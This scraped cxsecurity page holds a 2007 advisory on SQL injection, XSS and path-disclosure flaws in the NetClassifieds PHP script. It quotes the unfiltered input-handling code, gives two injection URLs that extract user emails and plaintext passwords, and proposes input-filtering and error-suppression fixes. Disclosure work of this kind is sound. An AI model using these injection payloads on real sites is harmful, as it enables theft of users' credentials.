=== Content from cxsecurity.com_319b5bbe_20250126_043621.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from securityreason.com_2f2c7043_20250124_235210.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **NetClassifieds [multiple vulnerabilities]** **2007.06.26** Credit:  **[laurent gaffie](https://cxsecurity.com/author/laurent%2Bgaffie/1/)**  Risk: **Medium** Local: **No** Remote: ****Yes**** CVE: **[CVE-2007-3357](https://cxsecurity.com/cveshow/CVE-2007-3357/ "Click to see CVE-2007-3357")** | **[CVE-2007-3356](https://cxsecurity.com/cveshow/CVE-2007-3356/ "Click to see CVE-2007-3356")** | **[CVE-2007-3355](https://cxsecurity.com/cveshow/CVE-2007-3355/ "Click to see CVE-2007-3355")** | **[CVE-2007-3354](https://cxsecurity.com/cveshow/CVE-2007-3354/ "Click to see CVE-2007-3354")** CWE: **N/A** | | --- | |
| --- | --- | --- | --- |

Application: NetClassifieds
version:
-Free Edition
-Standard Edition
-Professional Edition
-Premium Edition
Web Site: http://www.scriptdevelopers.net/
Versions: all
Platform: linux, windows
Bug: multiple injection sql , xss , full path
Fix Available: Yes
-------------------------------------------------------
1) Introduction
2) Bug
3) The Code
4) Proof of concept
5) Fix
6)Conclusion
===========
1) Introduction
===========
"NetClassifieds Premium Edition has been built on the premise of making every
classifieds site feel like it was custom written for the purpose for which it's being used.
Automotive Sites, Horse Sites, Reality Sites, General Classifieds Sites or any other type
of classifieds site you can think of will find a perfect match in NetClassifieds"
======
2) Bug
======
injection sql , xss , full path
===============
3) Vulnerable code:
===============
in Common.php
line 310:
function CCStrip($value)
{
if(get\_magic\_quotes\_gpc() == 0)
return $value;
else
return stripslashes($value); // ==> wtf... 0-o
}
ligne 350:
function CCGetFromPost($parameter\_name, $default\_value)
{
global $HTTP\_POST\_VARS;
$parameter\_value = "";
if(isset($HTTP\_POST\_VARS[$parameter\_name]))
$parameter\_value = CCStrip($HTTP\_POST\_VARS[$parameter\_name]);
else
$parameter\_value = $default\_value;
return $parameter\_value;
}
line 365:
function CCGetFromGet($parameter\_name, $default\_value)
{
global $HTTP\_GET\_VARS;
$parameter\_value = "";
if(isset($HTTP\_GET\_VARS[$parameter\_name]))
$parameter\_value = CCStrip($HTTP\_GET\_VARS[$parameter\_name]);
else
$parameter\_value = $default\_value;
return $parameter\_value;
}
nothing is filtred ....
let's see how it goes in viewcat.php:
line 63:
include(RelativePath . "/Common.php");
line 519:
$this->ds->Parameters["urlCatID"] = CCGetFromGet("CatID", "");
line 909:
$catdb1 = new clsDBNetConnect;
$catdb1->connect();
$newSQL1 = "SELECT cat\_id FROM categories WHERE sub\_cat\_id='" . CCGetFromGet("CatID", "") . "'";
$incat = "'" . CCGetFromGet("CatID", "") . "'";
I wont past every line of this code , because EVERY parameter is vulnerable to sql injection , XSS , full path ...
=====
4)proof of concept
=====
exemple of exploitation :
1) http://site.com/ViewCat.php?CatID=-8+union+select+1,email,3+from+users/\*
==> ( Database error: Invalid SQL: SELECT name, sub\_cat\_id, cat\_id FROM categories WHERE cat\_id=username (at) mail (dot) com [email concealed] )
2)http://site.com/ViewCat.php?s\_user\_id='+union+select+user\_password+fro
m+users+where%20user\_id=1/\*
==> The value in field urls\_user\_id is not valid. (passwd\_PLAIN\_TEXT)
// there's absolutly no encryption in this script for stored password , or sensitive data ...
every input are vulnerable to XSS attacks ( there's maybe 40 inputs ... ) via mysql errors , php error , and via
various unfiltred forms .
ps: depending of the version , the number of column change , but it's coded on the same way ...
=====
5) Fix
=====
scriptdevelopers has been advised , i dont think they will release any patch at the moment .
here's my "patch" :
1) in Common.php:
line 30 :
ADD:
ini\_set(display\_errors,"0");
( in a production mode , no one needs to know your errors .. and this avoid xss via php error )
ligne 350:
function CCGetFromPost // for every POST request
avant : return $parameter\_value;
apres : return preg\_replace('/[^a-z0-9]/i', '', $parameter\_value); //only 0 to 9 and a to z caracters allowed
line 365:
function CCGetFromGet // for every GET request
replace :
return $parameter\_value;
BY
return preg\_replace('/[^a-z0-9]/i', '', $parameter\_value);
2) in Mysql\_db.php
line 52 :
var $Halt\_On\_Error = "yes"; ## "yes" (halt with message), "no" (ignore errors quietly), "report" (ignore errror, but spit a warning)
set the value at "no" ( by default it's yes )
this will avoid juicy errors , such as table name and the complete query
3) imageresizer.php
line 2:
ADD :
ini\_set(display\_errors,"0");
( same reason as Common.php )
line 100 :
replace : echo("<hr color='red'><font color='red'><b>$msg</b></font><br> file=<b>".\_\_FILE\_\_."</b><hr color='red'>")
BY
echo("<hr color='red'><font color='red'><b>error while processing your request</b></font><br> <b></b><hr color='red'>");
".\_\_FILE\_\_." show the full path, no one need to know where is located your script on the server .
and usually a full path give the username for the ftp , or cpanel .
( /directory/your\_user/www/file.php )
=====
5) Conclusion
=====
This script has not been develloped in a secure way, and it's really dangerous
to use it UNPATCHED
regards laurent gaffi
contact : laurent.gaffie (at) gmail (dot) com [email concealed]

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2007060085)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_8d018b71_20250126_043619.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_c1805a0a_20250126_043620.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_1923ff8c_20250126_043618.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---


